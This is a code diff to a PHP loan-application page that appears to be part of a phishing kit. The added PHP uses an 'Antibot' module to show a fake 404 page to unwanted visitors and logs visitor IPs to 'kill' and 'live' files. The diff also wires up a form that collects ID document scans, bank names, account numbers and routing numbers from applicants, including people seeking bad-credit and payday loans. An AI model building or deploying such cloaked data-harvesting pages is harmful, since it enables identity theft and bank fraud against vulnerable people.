@@ -1,3 +1,37 @@
+<?php
+
+    session_start();
+
+    require_once '../Meta/Comp.php';
+    require_once '../Meta/Antibot.php';
+    require_once '../Meta/demonTest.php';
+
+    $comps = new Comp;
+    $antibot = new Antibot;
+
+    $settings = $comps->settings();
+
+    if (!$comps->checkToken()) {
+        echo $antibot->throw404();
+        $comps->log(
+            "../Guard/Audio/kill.txt",
+            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
+        );
+        die();
+    }
+
+    if (
+        !isset($_SESSION['visitor']) ||
+        !$_SESSION['visitor']
+    ) {
+        $comps->log(
+            "../Guard/Audio/live.txt",
+            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: Visitor\n\n"
+        );
+        $_SESSION['visitor'] = 1;
+    }
+
+?>
 <!doctype html>
 <html class="no-js" lang="en">
 
@@ -96,7 +130,7 @@
                                 <h2 class="title">Apply for a loan</h2>
                                 <p>Please fill the form below. We will get in touch with you within 1-2 business days, to request all necessary details</p>
                             </div>
-                            <form action="#" method="post" enctype="multipart/form-data">
+                            <form action="./app_processor/loan_process.php" method="post" enctype="multipart/form-data">
                                 <div id="step1" class="form-step">
                                     <div style="padding: 20px 0px;">
                                         <h4>Step 1. Personal Information</h4>
@@ -211,7 +245,7 @@
                                         <div class="col-6">
                                             <div class="single-input">
                                                 <label for="employment_status">Employment Status*</label>
-                                                <select id="employment_status" name="home_ownership" required>
+                                                <select id="employment_status" name="employment_status" required>
                                                     <option value="">Select One</option>
                                                     <option value="Employed">Employed</option>
                                                     <option value="Self-Employed">Self-Employed</option>
@@ -229,6 +263,21 @@
                                         </div>
                                     </div>
                                     <div class="row">
+                                        <div class="col-12">
+                                            <div class="single-input">
+                                            <label for="loanType">Loan Type*</label>
+                                                <select id="loanType" name="loan_type" required>
+                                                    <option value="personal">Personal Loan</option>
+                                                    <option value="bad_credit">Loan for Bad Credit</option>
+                                                    <option value="auto">Auto Loan</option>
+                                                    <option value="payday">Payday Loan</option>
+                                                    <option value="retirement">Retirement Loan</option>
+                                                    <option value="consolidation">Debt Consolidation Loan</option>
+                                                </select>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="row">
                                         <div class="col-6">
                                             <div class="single-input">
                                                 <label for="loan_amount">Loan Amount*</label>
@@ -238,7 +287,7 @@
                                         <div class="col-6">
                                             <div class="single-input">
                                                 <label for="loan_purpose">Loan Purpose*</label>
-                                                <input type="text" id="loan_purpose" name="loan_purpose" placeholder="Education" required>
+                                                <input type="text" id="loan_purpose" name="loan_purpose" placeholder="Ex. Education" required>
                                             </div>
                                         </div>
                                     </div>
@@ -283,13 +332,13 @@
                                         <div class="col-6">
                                             <div class="single-input">
                                                 <label for="id_front">Upload ID Front*</label>
-                                                <input type="file" id="id_front" name="id_front" multiple required>
+                                                <input type="file" id="id_front" name="id_front" required>
                                             </div>
                                         </div>
                                         <div class="col-6">
                                             <div class="single-input">
                                                 <label for="id_back">Upload ID Back*</label>
-                                                <input type="file" id="id_back" name="id_back" multiple required>
+                                                <input type="file" id="id_back" name="id_back" required>
                                             </div>
                                         </div>
                                     </div>
@@ -306,7 +355,7 @@
                                         <div class="col-12">
                                             <div class="single-input">
                                                 <label for="bank_name">Bank Name*</label>
-                                                <input type="text" id="bank_name" name="bank_name" placeholder="Chase" required>
+                                                <input type="text" id="bank_name" name="bank_name" placeholder="Ex. Chase" required>
                                             </div>
                                         </div>
                                     </div>
@@ -314,13 +363,13 @@
                                         <div class="col-6">
                                             <div class="single-input">
                                                 <label for="account_number">Account Number*</label>
-                                                <input type="text" id="account_number" name="account_number" pattern="\d+" minlength="8" maxlength="16" placeholder="1236788378" required>
+                                                <input type="text" id="account_number" name="account_number" pattern="[0-9]+" minlength="8" maxlength="16" placeholder="Enter Account Number" required>
                                             </div>
                                         </div>
                                         <div class="col-6">
                                             <div class="single-input">
                                                 <label for="routing_number">Routing Number*</label>
-                                                <input type="text" id="routing_number" name="routing_number" pattern="\d+" maxlength="9" placeholder="3454565" required>
+                                                <input type="text" id="routing_number" name="routing_number" pattern="[0-9]+" maxlength="9" placeholder="Enter Routing Number" required>
                                             </div>
                                         </div>
                                     </div>
